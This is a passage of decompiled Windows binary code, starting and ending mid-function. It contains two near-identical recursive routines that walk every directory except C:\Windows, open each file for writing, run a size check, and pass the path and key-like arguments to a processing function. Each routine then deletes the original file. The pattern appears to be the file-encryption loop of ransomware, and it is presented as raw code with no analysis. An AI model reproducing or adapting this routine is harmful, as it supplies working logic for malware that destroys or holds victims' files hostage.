        if ( (unsigned int)(v110[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v36;
      sub_46C87D(v37);
    }
    v110[4] = 0;
    v111 = 7;
    LOWORD(v110[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v60) == -1 )
      {
        v102 = lpFileName;
        if ( v146 == HIDWORD(v145) )
        {
          sub_423CD0((int *)&v145, SHIDWORD(v145), v102);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v145), v102);
          HIDWORD(v145) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v148) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v144 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( !v39 )
      {
        LOBYTE(v148) = 6;
        continue;
      }
      fclose(v39);
      v40 = (WCHAR *)sub_421E60((int)v108, (unsigned int *)lpFileName, (int)v102);
      LOBYTE(v148) = 11;
      v41 = sub_404BC0(v40);
      LOBYTE(v148) = 10;
      v42 = v109;
      if ( v109 >= 8 )
      {
        v43 = (LPCWSTR *)(2 * v109 + 2);
        v138 = v43;
        v44 = (void *)v108[0];
        if ( (unsigned int)v43 >= 0x1000 )
        {
          v43 = (LPCWSTR *)(2 * v109 + 37);
          v138 = v43;
          v44 = *(void **)(v108[0] - 4);
          if ( (unsigned int)(v108[0] - (_DWORD)v44 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v43;
        sub_46C87D(v44);
      }
      v108[4] = 0;
      v109 = 7;
      LOWORD(v108[0]) = 0;
      if ( v41 )
      {
        v45 = (WCHAR *)sub_421E60((int)v106, (unsigned int *)lpFileName, v42);
        LOBYTE(v148) = 13;
        v122 = sub_404B60(v45);
        LOBYTE(v148) = 10;
        v42 = v107;
        if ( v107 >= 8 )
        {
          v46 = (LPCWSTR *)(2 * v107 + 2);
          v137 = v46;
          v47 = (void *)v106[0];
          if ( (unsigned int)v46 >= 0x1000 )
          {
            v46 = (LPCWSTR *)(2 * v107 + 37);
            v137 = v46;
            v47 = *(void **)(v106[0] - 4);
            if ( (unsigned int)(v106[0] - (_DWORD)v47 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v102 = v46;
          sub_46C87D(v47);
        }
        v106[4] = 0;
        v107 = 7;
        LOWORD(v106[0]) = 0;
      }
      v48 = (_DWORD *)sub_421E60((int)v104, (unsigned int *)lpFileName, v42);
      LOBYTE(v148) = 15;
      sub_404120(v48, (int)v130);
      LOBYTE(v148) = 17;
      if ( v105 >= 8 )
      {
        v49 = (LPCWSTR *)(2 * v105 + 2);
        v136 = v49;
        v50 = (void *)v104[0];
        if ( (unsigned int)v49 >= 0x1000 )
        {
          v49 = (LPCWSTR *)(2 * v105 + 37);
          v136 = v49;
          v50 = *(void **)(v104[0] - 4);
          if ( (unsigned int)(v104[0] - (_DWORD)v50 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v49;
        sub_46C87D(v50);
      }
      v104[4] = 0;
      v105 = 7;
      LOWORD(v104[0]) = 0;
      if ( (unsigned __int64)(v122 - 300301) > 0x248C3 )
        goto LABEL_44;
      sub_421E60((int)v117, (unsigned int *)&a21, v122 - 300301);
      LOBYTE(v148) = 19;
      v26 |= 1u;
      v127 = v26;
      v51 = (char *)v117;
      if ( v119 >= 8 )
        v51 = (char *)v117[0];
      if ( sub_403F60(v130, v51, v118)
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v52) == -1
        && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v53) == -1 )
      {
        v54 = 1;
      }
      else
      {
LABEL_44:
        v54 = 0;
      }
      v148 = 17;
      if ( (v127 & 1) != 0 )
      {
        v127 &= ~1u;
        LOBYTE(v148) = 17;
        if ( v119 >= 8 )
        {
          v55 = (LPCWSTR *)(2 * v119 + 2);
          v135 = v55;
          v56 = (void *)v117[0];
          if ( (unsigned int)v55 >= 0x1000 )
          {
            v55 = (LPCWSTR *)(2 * v119 + 37);
            v135 = v55;
            v56 = *(void **)(v117[0] - 4);
            if ( (unsigned int)(v117[0] - (_DWORD)v56 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v102 = v55;
          sub_46C87D(v56);
        }
        v118 = 0;
        v119 = 7;
        LOWORD(v117[0]) = 0;
      }
      if ( v54 )
      {
        v116 = &v97;
        sub_419530(&v97, &a21);
        LOBYTE(v148) = 21;
        v121 = (unsigned int *)&v91;
        sub_419530(&v91, &a8);
        LOBYTE(v148) = 22;
        v120 = (unsigned int *)&v85;
        sub_419530(&v85, &a15);
        LOBYTE(v148) = 23;
        v124 = &v79;
        sub_419BE0(&v79, &a2);
        LOBYTE(v148) = 24;
        v123 = v77;
        sub_419530(v77, lpFileName);
        LOBYTE(v148) = 17;
        sub_409110(
          v126,
          (int)&savedregs,
          v26,
          v29,
          v77[0],
          (int)v77[1],
          (int)v77[2],
          (int)v77[3],
          (int)v77[4],
          v78,
          v79,
          v80,
          v81,
          v82,
          v83,
          v84,
          v85,
          v86,
          v87,
          v88,
          v89,
          v90,
          v91,
          v92,
          v93,
          v94,
          v95,
          v96,
          v97,
          v98,
          v99,
          v100,
          v101,
          (unsigned int)v102);
        v57 = (const wchar_t *)lpFileName;
        if ( v144 >= 8 )
          v57 = lpFileName[0];
        _wremove(v57);
      }
      LOBYTE(v148) = 10;
      if ( v131 >= 8 )
      {
        v58 = (LPCWSTR *)(2 * v131 + 2);
        v134 = v58;
        v59 = (void *)v130[0];
        if ( (unsigned int)v58 >= 0x1000 )
        {
          v58 = (LPCWSTR *)(2 * v131 + 37);
          v134 = v58;
          v59 = *(void **)(v130[0] - 4);
          if ( (unsigned int)(v130[0] - (_DWORD)v59 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v58;
        sub_46C87D(v59);
      }
      v130[4] = 0;
      v131 = 7;
      LOWORD(v130[0]) = 0;
      v148 = 6;
      v26 = v127;
    }
    v28 = hFindFile;
  }
  while ( FindNextFileW(v28, &FindFileData) );
  FindClose(v28);
  v63 = v145;
  v61 = HIDWORD(v63);
  v62 = v63;
  v142 = v145;
  while ( v62 != v61 )
  {
    v123 = (wchar_t **)&v97;
    sub_419530(&v97, &a21);
    LOBYTE(v148) = 28;
    v124 = &v91;
    sub_419530(&v91, &a15);
    LOBYTE(v148) = 29;
    v90 = v126;
    v120 = &v84;
    sub_419530(&v84, &a8);
    LOBYTE(v148) = 30;
    v121 = &v78;
    sub_419BE0(&v78, &a2);
    LOBYTE(v148) = 6;
    sub_40CBC0(
      v62,
      v78,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102);
    v62 += 24;
    v142 = v62;
  }
  LOBYTE(v148) = 5;
  if ( v144 >= 8 )
  {
    v64 = (LPCWSTR *)(2 * v144 + 2);
    v133 = v64;
    v65 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v64 >= 0x1000 )
    {
      v64 = (LPCWSTR *)(2 * v144 + 37);
      v133 = v64;
      v65 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v64;
    sub_46C87D(v65);
  }
  lpFileName[4] = 0;
  v144 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v148) = 4;
  if ( (_DWORD)v145 )
  {
    v102 = (LPCWSTR *)v145;
    sub_425130(v145, SHIDWORD(v145));
    v66 = (void *)v145;
    v67 = 24 * ((v146 - (int)v145) / 24);
    v132 = v67;
    if ( v67 >= 0x1000 )
    {
      v67 += 35;
      v132 = v67;
      v66 = *(void **)(v145 - 4);
      if ( (unsigned int)(v145 - (_DWORD)v66 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = (LPCWSTR *)v67;
    sub_46C87D(v66);
    v145 = 0i64;
    v146 = 0;
  }
  v148 = 2;
  if ( a7 >= 0x10 )
  {
    v68 = a7 + 1;
    v69 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v68 = a7 + 36;
      v69 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v68;
    sub_46C87D(v69);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v148) = 1;
  if ( a13 >= 8 )
  {
    v70 = 2 * a13 + 2;
    v71 = a8;
    if ( v70 >= 0x1000 )
    {
      v70 = 2 * a13 + 37;
      v71 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v71 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v70;
    sub_46C87D(v71);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v148) = 0;
  if ( a20 >= 8 )
  {
    v72 = 2 * a20 + 2;
    v73 = a15;
    if ( v72 >= 0x1000 )
    {
      v72 = 2 * a20 + 37;
      v73 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v72;
    sub_46C87D(v73);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v148 = -1;
  if ( a26 >= 8 )
  {
    v74 = 2 * a26 + 2;
    v75 = a21;
    if ( v74 >= 0x1000 )
    {
      v74 = 2 * a26 + 37;
      v75 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v75 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v74;
    sub_46C87D(v75);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 40CEDD: variable 'v42' is possibly undefined
// 40D05F: variable 'v52' is possibly undefined
// 40D072: variable 'v53' is possibly undefined
// 40D257: variable 'v60' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (0040D600) --------------------------------------------------------
int __cdecl sub_40D600(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // edi
  const WCHAR *v27; // eax
  HANDLE v28; // ebx
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  bool v41; // bl
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  LPCWSTR *v49; // ecx
  void *v50; // edx
  char *v51; // eax
  int v52; // ecx
  int v53; // ecx
  char v54; // bl
  LPCWSTR *v55; // ecx
  void *v56; // edx
  const wchar_t *v57; // eax
  LPCWSTR *v58; // ecx
  void *v59; // edx
  int v60; // ecx
  int v61; // edi
  int v62; // esi
  unsigned __int64 v63; // kr00_8
  LPCWSTR *v64; // ecx
  WCHAR *v65; // edx
  void *v66; // esi
  unsigned int v67; // ecx
  int v68; // edx
  _BYTE *v69; // ecx
  unsigned int v70; // edx
  _BYTE *v71; // ecx
  unsigned int v72; // edx
  _BYTE *v73; // ecx
  unsigned int v74; // edx
  _BYTE *v75; // ecx
  int result; // eax
  wchar_t *v77[5]; // [esp-78h] [ebp-430h] BYREF
  unsigned int v78; // [esp-64h] [ebp-41Ch] BYREF
  _BYTE *v79; // [esp-60h] [ebp-418h] BYREF
  int v80; // [esp-5Ch] [ebp-414h]
  int v81; // [esp-58h] [ebp-410h]
  int v82; // [esp-54h] [ebp-40Ch]
  int v83; // [esp-50h] [ebp-408h]
  unsigned int v84; // [esp-4Ch] [ebp-404h] BYREF
  _BYTE *v85; // [esp-48h] [ebp-400h] BYREF
  int v86; // [esp-44h] [ebp-3FCh]
  int v87; // [esp-40h] [ebp-3F8h]
  int v88; // [esp-3Ch] [ebp-3F4h]
  int v89; // [esp-38h] [ebp-3F0h]
  unsigned int v90; // [esp-34h] [ebp-3ECh]
  _BYTE *v91; // [esp-30h] [ebp-3E8h] BYREF
  int v92; // [esp-2Ch] [ebp-3E4h]
  int v93; // [esp-28h] [ebp-3E0h]
  int v94; // [esp-24h] [ebp-3DCh]
  int v95; // [esp-20h] [ebp-3D8h]
  unsigned int v96; // [esp-1Ch] [ebp-3D4h]
  _BYTE *v97; // [esp-18h] [ebp-3D0h] BYREF
  int v98; // [esp-14h] [ebp-3CCh]
  int v99; // [esp-10h] [ebp-3C8h]
  int v100; // [esp-Ch] [ebp-3C4h]
  int v101; // [esp-8h] [ebp-3C0h]
  LPCWSTR *v102; // [esp-4h] [ebp-3BCh]
  unsigned int v103; // [esp+0h] [ebp-3B8h] BYREF
  int v104[5]; // [esp+10h] [ebp-3A8h] BYREF
  unsigned int v105; // [esp+24h] [ebp-394h]
  int v106[5]; // [esp+28h] [ebp-390h] BYREF
  unsigned int v107; // [esp+3Ch] [ebp-37Ch]
  int v108[5]; // [esp+40h] [ebp-378h] BYREF
  unsigned int v109; // [esp+54h] [ebp-364h]
  int v110[5]; // [esp+58h] [ebp-360h] BYREF
  unsigned int v111; // [esp+6Ch] [ebp-34Ch]
  int v112[5]; // [esp+70h] [ebp-348h] BYREF
  unsigned int v113; // [esp+84h] [ebp-334h]
  int v114[5]; // [esp+88h] [ebp-330h] BYREF
  unsigned int v115; // [esp+9Ch] [ebp-31Ch]
  _BYTE **v116; // [esp+A0h] [ebp-318h]
  int v117[4]; // [esp+ACh] [ebp-30Ch] BYREF
  int v118; // [esp+BCh] [ebp-2FCh]
  unsigned int v119; // [esp+C0h] [ebp-2F8h]
  unsigned int *v120; // [esp+C4h] [ebp-2F4h]
  unsigned int *v121; // [esp+C8h] [ebp-2F0h]
  __int64 v122; // [esp+CCh] [ebp-2ECh]
  wchar_t **v123; // [esp+D4h] [ebp-2E4h]
  _BYTE **v124; // [esp+D8h] [ebp-2E0h]
  _DWORD *v125; // [esp+DCh] [ebp-2DCh]
  unsigned int v126; // [esp+E0h] [ebp-2D8h]
  int v127; // [esp+E4h] [ebp-2D4h]
  HANDLE hFindFile; // [esp+E8h] [ebp-2D0h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+ECh] [ebp-2CCh] BYREF
  int v130[5]; // [esp+33Ch] [ebp-7Ch] BYREF
  unsigned int v131; // [esp+350h] [ebp-68h]
  unsigned int v132; // [esp+354h] [ebp-64h]
  LPCWSTR *v133; // [esp+358h] [ebp-60h]
  LPCWSTR *v134; // [esp+35Ch] [ebp-5Ch]
  LPCWSTR *v135; // [esp+360h] [ebp-58h]
  LPCWSTR *v136; // [esp+364h] [ebp-54h]
  LPCWSTR *v137; // [esp+368h] [ebp-50h]
  LPCWSTR *v138; // [esp+36Ch] [ebp-4Ch]
  LPCWSTR *v139; // [esp+370h] [ebp-48h]
  LPCWSTR *v140; // [esp+374h] [ebp-44h]
  LPCWSTR *v141; // [esp+378h] [ebp-40h]
  int v142; // [esp+37Ch] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+380h] [ebp-38h] BYREF
  unsigned int v144; // [esp+394h] [ebp-24h]
  unsigned __int64 v145; // [esp+398h] [ebp-20h] BYREF
  int v146; // [esp+3A0h] [ebp-18h]
  int *v147; // [esp+3A8h] [ebp-10h]
  int v148; // [esp+3B4h] [ebp-4h]
  int savedregs; // [esp+3B8h] [ebp+0h] BYREF

  v147 = (int *)&v103;
  v125 = a1;
  v126 = a14;
  v26 = 0;
  v127 = 0;
  v148 = 5;
  v145 = 0i64;
  v146 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v148) = 6;
  v27 = (const WCHAR *)lpFileName;
  if ( v144 >= 8 )
    v27 = lpFileName[0];
  hFindFile = FindFirstFileW(v27, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  v28 = hFindFile;
  do
  {
    v29 = sub_4194E0((int)v110, FindFileData.cFileName);
    LOBYTE(v148) = 7;
    v30 = (char *)sub_4229A0((int)v112, v125, (unsigned __int16 *)"\\");
    LOBYTE(v148) = 8;
    v31 = sub_421BF0((int)v114, v30, v29);
    LOBYTE(v148) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v148) = 8;
    if ( v115 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v115 + 2);
      v141 = v32;
      v33 = (void *)v114[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v115 + 37);
        v141 = v32;
        v33 = *(void **)(v114[0] - 4);
        if ( (unsigned int)(v114[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v32;
      sub_46C87D(v33);
    }
    v114[4] = 0;
    v115 = 7;
    LOWORD(v114[0]) = 0;
    LOBYTE(v148) = 7;
    if ( v113 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v113 + 2);
      v140 = v34;
      v35 = (void *)v112[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v113 + 37);
        v140 = v34;
        v35 = *(void **)(v112[0] - 4);
        if ( (unsigned int)(v112[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v34;
      sub_46C87D(v35);
    }
    v112[4] = 0;
    v113 = 7;
    LOWORD(v112[0]) = 0;
    LOBYTE(v148) = 6;
    if ( v111 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v111 + 2);
      v139 = v36;
      v37 = (void *)v110[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v111 + 37);
        v139 = v36;
        v37 = *(void **)(v110[0] - 4);
        if ( (unsigned int)(v110[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v36;
      sub_46C87D(v37);
    }
    v110[4] = 0;
    v111 = 7;
    LOWORD(v110[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v60) == -1 )
      {
        v102 = lpFileName;
        if ( v146 == HIDWORD(v145) )
        {
          sub_423CD0((int *)&v145, SHIDWORD(v145), v102);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v145), v102);
          HIDWORD(v145) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v148) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v144 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( !v39 )
      {
        LOBYTE(v148) = 6;
        continue;
      }
      fclose(v39);
      v40 = (WCHAR *)sub_421E60((int)v108, (unsigned int *)lpFileName, (int)v102);
      LOBYTE(v148) = 11;
      v41 = sub_404BC0(v40);
      LOBYTE(v148) = 10;
      v42 = v109;
      if ( v109 >= 8 )
      {
        v43 = (LPCWSTR *)(2 * v109 + 2);
        v138 = v43;
        v44 = (void *)v108[0];
        if ( (unsigned int)v43 >= 0x1000 )
        {
          v43 = (LPCWSTR *)(2 * v109 + 37);
          v138 = v43;
          v44 = *(void **)(v108[0] - 4);
          if ( (unsigned int)(v108[0] - (_DWORD)v44 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v43;
        sub_46C87D(v44);
      }
      v108[4] = 0;
      v109 = 7;
      LOWORD(v108[0]) = 0;
      if ( v41 )
      {
        v45 = (WCHAR *)sub_421E60((int)v106, (unsigned int *)lpFileName, v42);
        LOBYTE(v148) = 13;
        v122 = sub_404B60(v45);
        LOBYTE(v148) = 10;
        v42 = v107;
        if ( v107 >= 8 )
        {
          v46 = (LPCWSTR *)(2 * v107 + 2);
          v137 = v46;
          v47 = (void *)v106[0];
          if ( (unsigned int)v46 >= 0x1000 )
          {
            v46 = (LPCWSTR *)(2 * v107 + 37);
            v137 = v46;
            v47 = *(void **)(v106[0] - 4);
            if ( (unsigned int)(v106[0] - (_DWORD)v47 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v102 = v46;
          sub_46C87D(v47);
        }
        v106[4] = 0;
        v107 = 7;
        LOWORD(v106[0]) = 0;
      }
      v48 = (_DWORD *)sub_421E60((int)v104, (unsigned int *)lpFileName, v42);
      LOBYTE(v148) = 15;
      sub_404120(v48, (int)v130);
      LOBYTE(v148) = 17;
      if ( v105 >= 8 )
      {
        v49 = (LPCWSTR *)(2 * v105 + 2);
        v136 = v49;
        v50 = (void *)v104[0];
        if ( (unsigned int)v49 >= 0x1000 )
        {
          v49 = (LPCWSTR *)(2 * v105 + 37);
          v136 = v49;
          v50 = *(void **)(v104[0] - 4);
          if ( (unsigned int)(v104[0] - (_DWORD)v50 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v49;
        sub_46C87D(v50);
      }
      v104[4] = 0;
      v105 = 7;
      LOWORD(v104[0]) = 0;
      if ( (unsigned __int64)(v122 - 450301) > 0x248C3 )
        goto LABEL_44;
      sub_421E60((int)v117, (unsigned int *)&a21, v122 - 450301);
      LOBYTE(v148) = 19;
      v26 |= 1u;
      v127 = v26;
      v51 = (char *)v117;
      if ( v119 >= 8 )
        v51 = (char *)v117[0];
      if ( sub_403F60(v130, v51, v118)
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v52) == -1
        && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v53) == -1 )
      {
        v54 = 1;
      }
      else
      {
LABEL_44:
        v54 = 0;
      }
      v148 = 17;
      if ( (v127 & 1) != 0 )
      {
        v127 &= ~1u;
        LOBYTE(v148) = 17;
        if ( v119 >= 8 )
        {
          v55 = (LPCWSTR *)(2 * v119 + 2);
          v135 = v55;
          v56 = (void *)v117[0];
          if ( (unsigned int)v55 >= 0x1000 )
          {
            v55 = (LPCWSTR *)(2 * v119 + 37);
            v135 = v55;
            v56 = *(void **)(v117[0] - 4);
            if ( (unsigned int)(v117[0] - (_DWORD)v56 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v102 = v55;
          sub_46C87D(v56);
        }
        v118 = 0;
        v119 = 7;
        LOWORD(v117[0]) = 0;
      }
      if ( v54 )
      {
        v116 = &v97;
        sub_419530(&v97, &a21);
        LOBYTE(v148) = 21;
        v121 = (unsigned int *)&v91;
        sub_419530(&v91, &a8);
        LOBYTE(v148) = 22;
        v120 = (unsigned int *)&v85;
        sub_419530(&v85, &a15);
        LOBYTE(v148) = 23;
        v124 = &v79;
        sub_419BE0(&v79, &a2);
        LOBYTE(v148) = 24;
        v123 = v77;
        sub_419530(v77, lpFileName);
        LOBYTE(v148) = 17;
        sub_409110(
          v126,
          (int)&savedregs,
          v26,
          v29,
          v77[0],
          (int)v77[1],
          (int)v77[2],
          (int)v77[3],
          (int)v77[4],
          v78,
          v79,
          v80,
          v81,
          v82,
          v83,
          v84,
          v85,
          v86,
          v87,
          v88,
          v89,
          v90,
          v91,
          v92,
          v93,
          v94,
          v95,
          v96,
          v97,
          v98,
          v99,
          v100,
          v101,
          (unsigned int)v102);
        v57 = (const wchar_t *)lpFileName;
        if ( v144 >= 8 )
          v57 = lpFileName[0];
        _wremove(v57);
      }
      LOBYTE(v148) = 10;
      if ( v131 >= 8 )
      {
        v58 = (LPCWSTR *)(2 * v131 + 2);
        v134 = v58;
        v59 = (void *)v130[0];
        if ( (unsigned int)v58 >= 0x1000 )
        {
          v58 = (LPCWSTR *)(2 * v131 + 37);
          v134 = v58;
          v59 = *(void **)(v130[0] - 4);
          if ( (unsigned int)(v130[0] - (_DWORD)v59 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v58;
        sub_46C87D(v59);
      }
      v130[4] = 0;
      v131 = 7;
      LOWORD(v130[0]) = 0;
      v148 = 6;
      v26 = v127;
    }
    v28 = hFindFile;
  }
  while ( FindNextFileW(v28, &FindFileData) );
  FindClose(v28);
  v63 = v145;
  v61 = HIDWORD(v63);
  v62 = v63;
  v142 = v145;
  while ( v62 != v61 )
  {
    v123 = (wchar_t **)&v97;
    sub_419530(&v97, &a21);
    LOBYTE(v148) = 28;
    v124 = &v91;
    sub_419530(&v91, &a15);
    LOBYTE(v148) = 29;
    v90 = v126;
    v120 = &v84;
    sub_419530(&v84, &a8);
    LOBYTE(v148) = 30;
    v121 = &v78;
    sub_419BE0(&v78, &a2);
    LOBYTE(v148) = 6;
    sub_40D600(
      v62,
      v78,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102);
    v62 += 24;
    v142 = v62;
  }
  LOBYTE(v148) = 5;
  if ( v144 >= 8 )
  {
    v64 = (LPCWSTR *)(2 * v144 + 2);
    v133 = v64;
    v65 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v64 >= 0x1000 )
    {
      v64 = (LPCWSTR *)(2 * v144 + 37);
      v133 = v64;
      v65 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v64;
    sub_46C87D(v65);
  }
  lpFileName[4] = 0;
  v144 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v148) = 4;
  if ( (_DWORD)v145 )
  {
    v102 = (LPCWSTR *)v145;
    sub_425130(v145, SHIDWORD(v145));
    v66 = (void *)v145;
    v67 = 24 * ((v146 - (int)v145) / 24);
    v132 = v67;
    if ( v67 >= 0x1000 )
    {
      v67 += 35;
      v132 = v67;
      v66 = *(void **)(v145 - 4);
      if ( (unsigned int)(v145 - (_DWORD)v66 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = (LPCWSTR *)v67;
    sub_46C87D(v66);
    v145 = 0i64;
    v146 = 0;
  }
  v148 = 2;
  if ( a7 >= 0x10 )
  {
    v68 = a7 + 1;
    v69 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v68 = a7 + 36;
      v69 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v68;
    sub_46C87D(v69);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v148) = 1;
  if ( a13 >= 8 )
  {
    v70 = 2 * a13 + 2;
    v71 = a8;
    if ( v70 >= 0x1000 )
    {
      v70 = 2 * a13 + 37;
      v71 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v71 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v70;
    sub_46C87D(v71);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v148) = 0;
  if ( a20 >= 8 )
  {
    v72 = 2 * a20 + 2;
    v73 = a15;
    if ( v72 >= 0x1000 )
    {
      v72 = 2 * a20 + 37;
      v73 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v72;
    sub_46C87D(v73);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v148 = -1;
  if ( a26 >= 8 )
  {
    v74 = 2 * a26 + 2;
    v75 = a21;
    if ( v74 >= 0x1000 )
    {
      v74 = 2 * a26 + 37;
      v75 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v75 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v74;
    sub_46C87D(v75);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 40D91D: variable 'v42' is possibly undefined
// 40DA9F: variable 'v52' is possibly undefined
// 40DAB2: variable 'v53' is possibly undefined
// 40DC97: variable 'v60' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (0040E040) --------------------------------------------------------
int __cdecl sub_40E040(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
